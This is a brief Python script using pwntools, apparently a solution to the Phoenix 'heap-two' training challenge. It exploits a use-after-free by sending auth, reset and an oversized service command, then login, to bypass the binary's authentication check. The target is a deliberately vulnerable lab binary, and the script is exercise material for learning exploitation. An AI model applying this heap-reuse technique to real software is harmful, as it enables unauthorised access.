#!/usr/bin/env python3
from pwn import *

path = "/opt/phoenix/amd64/heap-two"
context.binary = path
# context.log_level = "debug"

io = process(path)
io.sendline(b"auth asdfasdf")
io.sendline(b"reset")
io.sendline(b"service " + b"a" * 256)
io.clean()
io.sendline(b"login")
print(io.recvline())
